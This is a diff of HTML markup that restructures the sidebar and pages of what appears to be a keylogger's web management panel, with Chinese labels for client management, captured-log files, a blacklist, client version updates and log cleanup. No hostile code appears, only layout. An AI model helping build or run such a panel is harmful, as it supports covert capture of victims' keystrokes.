@@ -1236,18 +1236,46 @@
 
     <div class="container">
         <div class="sidebar">
-            <h3>菜单</h3>
-            <div class="nav-item active" data-page="clients">
-                <i class="fas fa-laptop"></i> 客户端管理
+            <!-- 第一个父级：keylogger 管理 -->
+            <div class="nav-item menu-parent" id="menuParent">
+                <span><i class="fas fa-bars"></i> keylogger管理</span>
+                <i class="fas fa-chevron-down menu-arrow"></i>
             </div>
-            <div class="nav-item" data-page="logs">
-                <i class="fas fa-file-alt"></i> 日志文件
+            <div class="nav-sub-items" id="navSubItems">
+                <div class="nav-item active" data-page="clients">
+                    <i class="fas fa-laptop"></i> 客户端管理
+                </div>
+                <div class="nav-item" data-page="logs">
+                    <i class="fas fa-file-alt"></i> 日志文件
+                </div>
+                <div class="nav-item" data-page="blacklist">
+                    <i class="fas fa-ban"></i> 黑名单管理
+                </div>
+                <div class="nav-item" data-page="more">
+                    <i class="fas fa-ellipsis-h"></i> 更多
+                </div>
             </div>
-            <div class="nav-item" data-page="blacklist">
-                <i class="fas fa-ban"></i> 黑名单管理
+
+            <!-- 第二个父级：网络管理（如果你需要的话） -->
+            <div class="nav-item menu-parent" id="toolsParent">
+                <span><i class="fas fa-toolbox"></i> 网络管理</span>
+                <i class="fas fa-chevron-down menu-arrow"></i>
             </div>
-            <div class="nav-item" data-page="settings">
-                <i class="fas fa-cog"></i> 系统信息
+            <div class="nav-sub-items" id="toolsSubItems">
+                <div class="nav-item" data-page="network">
+                    <i class="fas fa-cog"></i> 网络配置
+                </div>
+            </div>
+
+            <!-- 第三个父级：系统 -->
+            <div class="nav-item menu-parent" id="systemParent">
+                <span><i class="fas fa-info-circle"></i> 系统</span>
+                <i class="fas fa-chevron-down menu-arrow"></i>
+            </div>
+            <div class="nav-sub-items" id="systemSubItems">
+                <div class="nav-item" data-page="system">
+                    <i class="fas fa-desktop"></i> 系统信息
+                </div>
             </div>
         </div>
 
@@ -1385,8 +1413,9 @@
                 </div>
             </div>
 
-            <!-- 系统信息页面 -->
-            <div id="settingsPage" class="page" style="display: none;">
+            <!-- 更多页面（仅保留版本管理和日志维护） -->
+            <div id="morePage" class="page" style="display: none;">
+                <!-- 客户端版本管理 -->
                 <div class="card">
                     <h3><i class="fas fa-mobile-alt"></i> 客户端版本管理</h3>
                     <p style="color: var(--gray); margin-bottom: 1rem; font-size: 0.9rem;">
@@ -1397,10 +1426,10 @@
                             <i class="fas fa-sync-alt"></i> 从Alist刷新版本列表
                         </button>
                     </div>
-                    <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
-                    </div>
                     <div id="versionsTable"></div>
                 </div>
+
+                <!-- 日志维护 -->
                 <div class="card">
                     <h3>日志维护</h3>
                     <p style="color: var(--gray); margin-bottom: 1rem; font-size: 0.9rem;">
@@ -1416,7 +1445,7 @@
                     </div>
                 </div>
 
-                <!-- 过期日志预览模态框 -->
+                <!-- 过期日志预览模态框（仍然归属于日志维护功能） -->
                 <div class="modal" id="expiredLogsModal">
                     <div class="modal-content" style="max-width: 700px;">
                         <div class="modal-header">
@@ -1442,6 +1471,10 @@
                         </div>
                     </div>
                 </div>
+            </div>
+
+            <!-- 系统信息页面 -->
+            <div id="systemPage" class="page" style="display: none;">
                 <div class="card">
                     <h3>系统信息</h3>
                     <div class="form-group">
